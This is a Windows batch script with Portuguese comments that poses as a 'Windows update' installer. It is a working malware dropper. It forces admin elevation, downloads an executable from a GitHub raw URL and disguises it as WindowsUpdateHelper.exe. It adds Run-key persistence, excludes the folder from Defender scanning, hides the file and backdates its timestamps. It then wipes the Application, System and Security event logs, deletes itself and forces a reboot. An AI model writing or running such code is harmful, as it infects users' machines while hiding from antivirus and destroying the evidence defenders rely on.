@echo off
setlocal enabledelayedexpansion
title Sistema de Atualizacao Windows

:: 1. VERIFICAÇÃO DE ADMINISTRADOR
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Solicitando permissao de administrador...
    powershell -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: 2. CONFIGURAÇÕES
set "GITHUB_EXE=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "DEST_NAME=WindowsUpdateHelper.exe"
set "DEST_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "DEST_PATH=%DEST_DIR%\%DEST_NAME%"
set "REG_NAME=WindowsAppsExplorer"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

color 0B
echo [*] Iniciando configuracao critica do sistema...

:: 3. LIMPEZA E PREPARAÇÃO
taskkill /f /im %DEST_NAME% >nul 2>&1
if not exist "%DEST_DIR%" mkdir "%DEST_DIR%" >nul 2>&1

:: 4. DOWNLOAD
echo [*] Sincronizando com o servidor...
powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%GITHUB_EXE%', '%DEST_PATH%')" >nul 2>&1

if not exist "%DEST_PATH%" (
    powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%GITHUB_EXE%' -OutFile '%DEST_PATH%' -UseBasicParsing" >nul 2>&1
)

:: 5. REGEDIT (Caminho de Inicializacao)
echo [*] Criando chaves de registro...
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "\"%DEST_PATH%\" --monitor" /f >nul 2>&1

:: 6. STEALTH (Ocultação e Spoofing)
echo [*] Ocultando arquivos do sistema...
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%DEST_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
attrib +s +h +r "%DEST_PATH%" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "$f=Get-Item '%DEST_PATH%'; $d=Get-Date '2021-05-15'; $f.CreationTime=$d; $f.LastWriteTime=$d; $f.LastAccessTime=$d" >nul 2>&1

:: 7. LIMPEZA DE RASTROS
wevtutil cl Application >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1

echo.
echo ======================================================
echo    INSTALACAO CONCLUIDA COM SUCESSO!
echo    O REGISTRO FOI CRIADO EM: 
echo    %REG_KEY%\%REG_NAME%
echo.
echo    O PC SERA REINICIADO EM 10 SEGUNDOS...
echo ======================================================
echo.

:: 8. AUTO-DELEÇÃO E REINICIALIZAÇÃO
(
    echo @echo off
    echo timeout /t 2 /nobreak ^>nul
    echo del "%~f0" ^>nul 2^>^&1
    echo shutdown /r /t 5 /f /c "Finalizando instalacao do sistema..."
    echo del "%%~f0" ^>nul 2^>^&1
) > "%TEMP%\reboot_rocket.bat"

start /min "" "%TEMP%\reboot_rocket.bat"
exit /b
